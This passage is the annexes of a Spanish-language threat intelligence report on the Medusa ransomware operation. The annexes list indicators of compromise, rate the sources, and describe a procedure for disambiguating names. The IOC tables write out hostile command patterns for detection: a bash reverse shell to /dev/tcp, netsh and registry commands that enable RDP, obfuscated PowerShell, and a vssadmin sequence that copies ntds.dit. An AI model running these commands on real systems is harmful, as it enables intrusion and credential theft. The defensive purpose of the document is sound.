| artefacto | **Las cuatro son de administración remota, transferencia de ficheros, gestión de seguridad o accesos privilegiados** | **No es un indicador: es el supuesto clave de `O-6` y la regla de arquitectura que se deriva.** Esas cuatro categorías de producto **no deben estar expuestas a Internet**, y cuando lo estén, deben tener la máxima prioridad de parcheo y de doble factor | Alta | Sin caducidad | **Regla de arquitectura** (`E-c`, `H-12`) |
| artefacto | **Explotación en menos de 24 h desde el anuncio, y hasta una SEMANA ANTES de la divulgación pública** | **El juicio central del informe.** La fuente añade que **no hay indicio de que desarrollen capacidad propia**: obtienen acceso anticipado de fuentes desconocidas. **Consecuencia: durante parte de la ventana de riesgo el parche no existía** | Alta *(afirmación directa de la fuente)* | **Sin caducidad** | **Replanteamiento del ciclo de parcheo** (`E-d`) |

### A.2 — Ficheros, artefactos y patrones de host

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| filename | `gaze.exe` | **Encriptador de Windows.** Detiene servicios de copia, seguridad, bases de datos, comunicación, compartición y web; borra instantáneas; cifra con AES-256 | Alta | Caduca con la variante | **Detección y bloqueo** |
| filename | `gaze.py` | **Encriptador de Linux**, transferido por SFTP y ejecutado desacoplado del terminal | Alta | Caduca con la variante | **Detección y bloqueo** |
| pattern | `.medusa` | **Extensión de los ficheros cifrados.** Indicador de impacto consumado: útil para confirmar, no para prevenir | Alta | Caduca con la variante | Confirmación de incidente |
| path | `C:\Windows\System32\kiwissp.log` | **Fichero donde la biblioteca de Mimikatz registra las contraseñas en claro.** Si existe, hay credenciales en claro en disco y el incidente está en curso. **Sin uso legítimo** | Alta | **Sin caducidad** | **Detección con contención automática** (`D-3`) |
| clave | `HKLM\SYSTEM\CurrentControlSet\Control\Lsa` → `Security Packages` con `mimilib` | **Persistencia de robo de credenciales.** El valor legítimo del sistema no incluye esa biblioteca | Alta | **Sin caducidad** | **Detección con contención automática** (`D-3`) |
| filename | `mimilib.dll` | Biblioteca de Mimikatz usada para el registro de contraseñas | Alta | Sin caducidad | **Detección** |
| filename | `openrdp.bat` | **Guion ejecutado con PsExec** que abre el escritorio remoto en tres pasos | Alta | Caduca con la campaña | **Detección** (`D-5`) |
| pattern | `advfirewall firewall add rule name="rdp" dir=in protocol=tcp localport=3389 action=allow` | **El nombre literal de la regla de cortafuegos es el discriminador.** Un administrador legítimo rara vez la llama así | Alta | **Sin caducidad** | **Detección** (`D-5`) |
| pattern | `firewall set rule group="windows management instrumentation (wmi)" new enable=yes` | Habilitación del grupo de reglas de gestión remota, segundo paso del mismo guion | Alta | **Sin caducidad** | **Detección** (`D-5`) |
| pattern | `fDenyTSConnections /t REG_DWORD /d 0` | Tercer paso: modificación del registro para permitir escritorio remoto | Alta | **Sin caducidad** | **Detección** (`D-5`) |
| filename | `lsp.exe` | **Es `rclone` renombrado.** La herramienta de exfiltración disfrazada | Alta | Caduca con la campaña; **el patrón no** | **Detección** (`D-9`) |
| filename | `ngconf.txt` | **Es el fichero de configuración de `rclone` renombrado** | Alta | Caduca con la campaña | **Detección** (`D-9`) |
| filename | `RunFileCopy.cmd` · `command.cmd` | **Guiones del paquete de despliegue** del encriptador: el primero copia el encriptador a la carpeta de sistema con `robocopy`, el segundo lo verifica y lo ejecuta | Alta | Caduca con la campaña | **Detección en la plataforma de despliegue** (`D-7`, `H-8`) |
| pattern | `file_save.php` · `key=UerT` · ruta `/file_save` | **Interfaz web de administración remota de una línea**: ejecuta lo que reciba si el parámetro de clave coincide. **La clave fija de cuatro caracteres es concluyente** | Alta | **Sin caducidad mientras no cambien la clave** | **Detección** (`D-8`) |
| pattern | `bash -i >& /dev/tcp/<dirección>/4444 0>&1` · `… /443 0>&1` | **Consola inversa de Linux** por redirección a un descriptor de red. Patrón clásico, puertos 4444 y 443 | Alta | **Sin caducidad** | **Detección** |
| pattern | `powershell -exec bypass -enc <base64>` | **Primer nivel de ofuscación** del actor | Alta | Sin caducidad | **Detección** (`D-6`) |
| pattern | `$x = 'D' + 'Own' + 'LOa' + 'DfI' + 'le'` | **Segundo nivel: troceado del nombre del método y referencia por variable.** Es el patrón más específico de los tres y el menos vigilado | Alta | **Sin caducidad** | **Detección** (`D-6`) |
| pattern | `GzipStream` + `FromBase64String` + `scriptblock` + `MemoryStream` + `Decompress` + `ReadToEnd` | **Tercer nivel: carga descomprimida en memoria y convertida en bloque de guion.** La carga resultante es **idéntica a un guion público de etapa** que crea consola inversa o de escucha sobre TLS en el puerto 443 | Alta | **Sin caducidad** | **Detección** (`D-6`) |
| pattern | `vssadmin` creación de instantánea → copia de `ntds.dit`, `system` y `security` → **borrado de la instantánea** | **La secuencia completa de robo de credenciales de dominio.** El tercer paso es el que la distingue de una copia de seguridad legítima | Alta | **Sin caducidad** | **Detección con contención automática** (`D-4`) |
| pattern | Política de dominio por defecto en estado **«habilitada y forzada»** | **Elevación por política:** sobreescribe políticas de grupo más estrictas que restringirían la actividad del actor. **Un cambio que desactiva varias defensas de golpe** | Alta | **Sin caducidad** | **Detección y alerta** (`X-5`) |
| pattern | Exclusión de la unidad `C:` completa del antivirus mediante orden de PowerShell codificada | Paso del paquete de despliegue del encriptador. **Una exclusión de unidad completa no tiene justificación operativa** | Alta | **Sin caducidad** | **Detección** (`D-7`) |
| pattern | `$env:NZ_SERVER` · `NZ_TLS` · `NZ_CLIENT_SECRET` · descarga del instalador del agente de monitorización desde su repositorio público | **Instalación de la herramienta pública de monitorización de servidores** usada como canal de visibilidad y acceso | Alta | Caduca con la campaña | **Detección** |

### A.3 — Red · **filtrar antes de bloquear; lo pide la propia fuente**

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| domain | `oast[.]site` · `oast[.]pro` · `oast[.]fun` | **Los tres dominios del servicio de verificación fuera de banda.** El formato observado es `<nombre-de-la-víctima>.<33 caracteres aleatorios>.oast.site`: **el nombre de la víctima viaja en la consulta**. Es el indicador de mayor valor del informe, y el único que detecta explotación confirmada antes del cifrado. **ATENCIÓN: es un servicio legítimo de pruebas de intrusión** | Alta como vía de abuso | **Sin caducidad** | **Detección y alerta, NO bloqueo a ciegas.** Correlacionar con la lista de ventanas de prueba autorizadas (`D-1`, `H-1`) |
| ipv4 | `143.244.47.89` | **Dirección usada para acceder a la interfaz web de administración remota en PHP.** El aviso la identifica como **de un proveedor comercial de VPN** | Alta | 2027-08-18 | **NO BLOQUEAR sin verificar.** Es un proveedor de VPN comercial: el bloqueo afectaría a usuarios legítimos, posiblemente propios. **Solo retrohunt** |
| ipv4 | `167.88.166.173` | **Dirección del proxy de la herramienta de túnel inverso** | Alta | 2027-08-18 | **Bloqueo, previa verificación** |
| ipv4 | `143.110.243.154` | Asociada además a un nombre de dominio de un tercero. **Posible infraestructura de un tercero comprometido** | Alta | 2027-08-18 | **Bloqueo, previa verificación**: puede ser un tercero comprometido |
| ipv4 | `83.138.53.139` | **Servidor de la herramienta de monitorización** usada como canal de acceso, en el puerto 80 | Alta | 2027-08-18 | **Bloqueo** |
| ipv4 | `185.238.231.16` · `185.238.231.4` · `185.238.231.77` · `185.238.231.85` · `185.238.231.98` | **Cinco direcciones del mismo `/24`.** Esa concentración justifica evaluar el bloqueo del prefijo en lugar de las direcciones individuales | Alta | 2027-08-18 | **Bloqueo, y evaluar el prefijo `185.238.231.0/24`** |
| ipv4 | `23.234.89.195` · `23.234.106.242` · `23.234.93.112` | Tres direcciones del mismo rango `23.234.0.0/16` | Alta | 2027-08-18 | **Bloqueo, previa verificación** |
| ipv4 | `155.2.215.71` · `155.2.215.69` | Dos direcciones del mismo `/24` | Alta | 2027-08-18 | **Bloqueo** |
| ipv4 | `146.70.172.247` · `37.19.21.180` | **Rangos habitualmente asociados a proveedores comerciales de VPN.** Verificar antes de actuar | Media | 2027-08-18 | **Verificar antes de bloquear.** Probable VPN comercial |
| ipv4 | `37.221.66.239` · `185.135.86.185` · `85.155.186.121` · `94.156.67.145` | Direcciones de la lista del aviso, sin descripción específica publicada | Alta | 2027-08-18 | **Bloqueo, previa verificación** |
| url | `https://3324.requestcatcher[.]com/hihi` | **URL asociada a las órdenes de la herramienta de túnel inverso.** Es un subdominio de un **servicio público legítimo de captura de peticiones**, muy usado en desarrollo | Alta para el subdominio | 2027-08-18 | **Bloqueo SÓLO de la URL completa. NO bloquear el dominio base**: es un servicio legítimo de uso masivo |

### A.4 — Herramientas y servicios legítimos abusados · **ninguno es malicioso**

<!-- cti:ioc -->

| Tipo | Valor | Contexto | Confianza | Caducidad | Acción permitida |
|---|---|---|---|---|---|
| herramienta | `AnyDesk` · `Atera` · `ConnectWise` · `eHorus` · `N-able` · `BeyondTrust` · `SimpleHelp` · `Splashtop` | **Ocho productos comerciales de administración remota, todos legítimos.** El actor **elige según los que ya estén presentes en el entorno de la víctima** para no destacar. **El indicador no es el producto: es la falta de autorización** | Alta | Sin caducidad | **No bloquear los productos en general.** Lista blanca y bloqueo del resto (`E-b`, `D-2`) |
| herramienta | `MeshAgent` / MeshCentral · herramienta pública de monitorización de servidores | **Agentes de gestión y monitorización públicos**, disponibles en repositorios abiertos, usados como canal de acceso | Alta | Sin caducidad | **Detección por contexto** |
| herramienta | Herramienta de túnel inverso · servicio de exposición de aplicaciones por nube · herramienta de conexión entre redes privadas | **Tres mecanismos legítimos de túnel** usados como mando y control. El segundo expone servicios internos a Internet **sin abrir ningún puerto en el cortafuegos** | Alta | Sin caducidad | **Bloqueo por egreso donde no haya uso justificado** |
| herramienta | `certutil` · PowerShell · WMI · `PsExec` · `robocopy` · `vssadmin` · `netsh` · `reg` · administrador de tareas · biblioteca del sistema para volcado de memoria | **Utilidades del propio sistema operativo.** Detección por contexto, nunca por presencia | Alta | Sin caducidad | **Detección por contexto** |
| herramienta | `Mimikatz` · `CrackMapExec` / NetExec · escáneres comerciales de red · `Rclone` · `Bandizip` | Herramientas públicas o comerciales. **`Rclone` aparece ya en el grafo de este repositorio por `CTI-2026-025`, con otro actor: es la tercera vez que esta herramienta entra en la cartera** | Alta | Sin caducidad | **Detección por contexto** (`D-9`) |
| herramienta | Plataformas comerciales de **despliegue de software y de gestión de endpoints** | **Infraestructura propia de la víctima, usada para distribuir el encriptador.** No es una herramienta del adversario: es la nuestra | Alta | Sin caducidad | **Doble aprobación para crear paquetes** (`E-h`, `D-7`) |
| herramienta | Controladores vulnerables o firmados | **Usados para matar o borrar el producto de detección de endpoint.** El paso que desactiva toda la demás visibilidad | Alta | Sin caducidad | **Activar la lista de bloqueo de controladores vulnerables** (`X-5`) |
| servicio | Perfil de anfitrión de virtualización | **Usado para cambiar las contraseñas de administrador de las máquinas Linux.** Funcionalidad legítima de la plataforma | Alta | Sin caducidad | **Doble factor en la consola del anfitrión, y credenciales distintas de las del dominio** |
| servicio | Red Tor · servicio de mensajería cifrada · Bitcoin | Canales de negociación y de pago. **Declarados con tipo `servicio` para que no entren en los agregados planos de este repositorio** | Alta | Sin caducidad | **Ninguna acción técnica** |

## Anexo B — Fuentes y valoración

> Valoración doble tipo Admiralty/OTAN: **fiabilidad de la fuente (A–F)** ×
> **credibilidad de la información (1–6)**. Se valoran por separado.

| Fuente | Disciplina | Fiabilidad | Credibilidad | Notas de sesgo |
|---|---|---|---|---|
| **Aviso conjunto AA25-071A del FBI, CISA y el Departamento de Salud y Servicios Humanos de EE. UU. — publicado el 12-03-2025 y actualizado el 18-08-2026** con información de investigaciones del FBI hasta abril de 2026. Leído en original | Fuente gubernamental · TECHINT de investigaciones federales | **A** | **1** | **Fuente principal y casi única.** Basada en investigaciones del FBI sobre más de 500 casos. **Declara su propio límite y pide verificar sus indicadores antes de bloquear**, lo que es señal de calidad y es la instrucción de uso del Anexo A. Publica cuatro paquetes STIX. **Sesgos a tener en cuenta:** su geografía y sus categorías sectoriales son estadounidenses; **no publica distribución por país**, de modo que no puede confirmar ni desmentir nada sobre la región |
| **Las dos versiones del mismo aviso, comparadas** | Fuente gubernamental · análisis propio | **A** | **1** | **Comparar las dos versiones es, en sí, una fuente:** la actualización de 2026 añadió el modelo de afiliados, las tarifas de los corredores, la verificación fuera de banda, la lista ampliada de vulnerabilidades, las técnicas de ofuscación y **la observación del uso de exploits anterior a la divulgación**. Es el único par de puntos comparables para `E-3` |
| **Análisis regional de un proveedor de seguridad sobre la operación en Latinoamérica (2025)** | OSINT comercial | **B** | **3** | Fuente del único dato regional concreto que hemos localizado: **una empresa de telecomunicaciones venezolana** entre las víctimas reivindicadas. Es de 2025 y no contiene distribución por país |
| **Rastreadores de sitios de filtración (2026)** | OSINT · datos del adversario | **D** | **4** | **Datos controlados por el adversario**, con el sesgo de publicación que `E-2` documenta: las víctimas que negocian **a veces no aparecen**. Fuente de los nueve casos de Brasil y del porcentaje estadounidense. **Discrepan entre sí en el total y uno discrepa del aviso en el año de inicio de la operación**, de modo que sus distribuciones no son comparables. **No se usa ninguna de sus cifras en los juicios clave** |
| **Cobertura periodística especializada de la actualización del aviso** | OSINT · prensa especializada | **C** | **3** | Útil para corroborar la lectura de la actualización. No aporta datos propios |

## Anexo C — Léxico de probabilidad y confianza

<!-- cti:bars title="Probabilidad estimativa — cuán probable es que el hecho sea cierto" -->

| Término | Techo del rango |
|---|---|
| Remoto | 5 |
| Muy poco probable | 20 |
| Poco probable | 45 |
| Posibilidad real | 55 |
| Probable | 80 |
| Muy probable | 95 |
| Casi con certeza | 99 |

| Nivel de confianza | Criterio |
|---|---|
| Alta | Múltiples fuentes de calidad, corroboradas, sin brechas relevantes |
| Moderada | Fuentes creíbles pero corroboración parcial o brechas conocidas |
| Baja | Fuente única, no corroborada, fuerte dependencia de supuestos |

> Usar siempre el término **y** el porcentaje. No usar «podría» ni «es posible»
> como juicio: son afirmaciones no falsables.

## Anexo D — Qué hacer cuando cuatro cosas comparten un nombre

Este anexo no es sobre Medusa. Es el procedimiento que este informe tuvo que aplicar antes de poder escribir una sola línea técnica, y se fija aparte porque va a volver a hacer falta: la industria tiene un número finito de nombres evocadores y un número creciente de familias, y la colisión es inevitable.

**El problema no es el de la fusión de alias, y conviene distinguirlos.** La fusión de alias —`CTI-2026-017`, `CTI-2026-022`, `CTI-2026-030`— ocurre cuando **dos actores reales se tratan como uno** por un solapamiento mal interpretado; es un error de análisis y se corrige con evidencia. La colisión de nombres es otra cosa: **cuatro cosas que nunca tuvieron nada que ver** acaban llamándose igual porque cuatro personas distintas eligieron, de forma independiente, la misma palabra. No hay error de análisis que corregir. Hay un problema de búsqueda, de etiquetado y de comunicación interna, y produce daños muy concretos.

**Los tres daños, en orden de frecuencia.** Primero, **el error de recuperación**: alguien busca el nombre en el repositorio de inteligencia propio y encuentra la entrada equivocada. Segundo, **el error de respuesta**: un hallazgo en un servidor Linux se trata como ransomware de Windows, o al contrario, y el plan que se activa no es el que corresponde. Tercero, y el más difícil de detectar, **el error de evaluación de riesgo**: una matriz que diga «Medusa: alta probabilidad» puede estar sumando la probabilidad de cuatro amenazas distintas con cuatro perfiles distintos.

**Las cuatro reglas que este informe aplicó.**

1. **Desambiguar antes de escribir, y hacerlo en una tabla visible, no en una nota al pie.** La tabla de `O-1` está al principio del nivel operacional por una razón: es lo primero que un analista necesita. Si hace falta buscarla, no sirve.
2. **Adoptar un calificador obligatorio y usarlo siempre.** Aquí, «Medusa (RaaS)». Un calificador entre paréntesis es barato, no estorba la lectura y hace que una búsqueda de texto acierte. **La convención sólo funciona si se aplica también en los documentos informales**, que es donde se rompe.
3. **Revisar el repositorio propio en busca de la colisión.** Este informe encontró que **el grafo de relaciones de este repositorio ya contenía un nodo llamado `medusa`** —el *rootkit* de Linux, aportado por otro informe y por otro actor—, lo que significa que la colisión no era hipotética: estaba dentro de casa. **Buscar el nombre en la propia base de conocimiento antes de añadir una entrada nueva debería ser un paso del procedimiento.**
4. **Citar la desambiguación de la fuente, si la hace.** Cuando el FBI dedica una frase de su aviso a aclarar que su Medusa no es los otros dos Medusa, **esa frase es evidencia de que la confusión ya está ocurriendo en el mundo real**, y conviene reproducirla en lugar de parafrasearla.

> **Y una observación sobre el límite de todo esto.** La desambiguación resuelve
> el problema dentro de nuestros documentos y no lo resuelve fuera: los
> informes de terceros, los titulares y las conversaciones seguirán diciendo
> «Medusa» sin calificador. Por eso la regla práctica más útil no es de
> nomenclatura sino de lectura: **ante cualquier mención externa del nombre,
> comprobar primero de cuál de los cuatro habla, mirando la plataforma, el
> comportamiento y la fecha** — y no dar por supuesto que es el que estábamos
> siguiendo. Es un reflejo, y cuesta unos segundos.

## Anexo E — Marcos de referencia empleados

`MITRE ATT&CK v19` —la versión que usa el aviso y que este informe hereda— · `Modelo del Diamante` · `Cyber Kill Chain` · `Pirámide del Dolor` · `F3EAD` · `ICD 203` · `ACH, supuestos clave y pre-mortem` · `TLP 2.0` · `PAP` · `Admiralty Code` · `Sigma` · `STIX 2.1`

## Anexo F — Paquete legible por máquina

- **Fuente preferente para ingesta: los paquetes STIX 2.1 de agosto de 2026** del aviso AA25-071A, en XML y en JSON. Los de marzo de 2025 se conservan en el aviso y **no deben mezclarse** con los nuevos sin controlar la fecha.
- **Instrucción obligatoria antes de la ingesta:** filtrar por el descargo de la propia fuente. Hay direcciones de un proveedor comercial de VPN y de proveedores de nube, y **tres filas del Anexo A.3 llevan advertencia explícita de no bloquear sin verificar**.
- Las tablas `cti:ioc` de los Anexos A.1 a A.4 alimentan `ioc_index.csv` en cada construcción, como selección razonada con fecha.
- **Reglas propias:** tres reglas Sigma en `X-4`. La de la verificación fuera de banda es la de mayor valor del informe y **requiere construir antes la lista de ventanas de prueba de intrusión autorizadas**, sin la cual generará falsos positivos legítimos.
- **Consultas propias:** cinco en KQL. La quinta —qué ficheros viven dentro de nuestras exclusiones del antivirus— no busca al adversario: **busca la carpeta que le estamos ofreciendo**.

## Anexo G — Control de cambios

| Versión | Fecha | Cambio | Autor |
|---|---|---|---|
| 1.0 | 2026-11-17 | Emisión inicial. Se eleva a juicio clave la observación del aviso sobre el **uso de exploits anterior a la divulgación pública** y su consecuencia sobre el ciclo de parcheo (`KJ-2`, `KJ-3`, `E-d`), se corrige la afirmación del requisito sobre Colombia como país más golpeado (`§3.5`, `KJ-5`), se documenta en `E-2` el sesgo de publicación de los recuentos de sitio de filtración heredando el método de `CTI-2026-025`, y se desambiguan **cuatro familias distintas llamadas «Medusa»**, una de ellas ya presente en el grafo de relaciones de este repositorio | Célula CTI |

## Anexo H — Realimentación del consumidor

| Pregunta | Respuesta |
|---|---|
| ¿Respondió a su requisito? | |
| ¿Qué decisión tomó o cambió con este informe? | |
| **¿Qué devolvió `H-1`, el retrohunt de consultas de DNS a los dominios de verificación?** | |
| **¿Cuántas herramientas de administración remota había en el parque, y cuántas estaban autorizadas (`E-b`)?** | |
| **¿Qué había dentro de las exclusiones del antivirus (`H-3`, `E-e`)?** | |
| ¿Se definió la segunda capa de defensa que no depende del parche (`E-d`)? | |
| ¿Se probó la restauración suponiendo perdida la plataforma de virtualización (`E-h`)? | |
| ¿Existe política de pago, y contempla que pagar pueda no cerrar el incidente (`E-f`)? | |
| ¿Llegó a tiempo? | |

> Sin este anexo devuelto, el ciclo de inteligencia queda abierto y el próximo
> producto no mejora. **Y de esta tabla, la pregunta decisiva es la de `E-d`**,
> porque es la única que responde al hallazgo central del informe: si el exploit
> puede llegar antes que el parche, ¿qué nos protege mientras tanto? Las demás
> preguntas se contestan con una consulta. Ésa se contesta con una decisión.
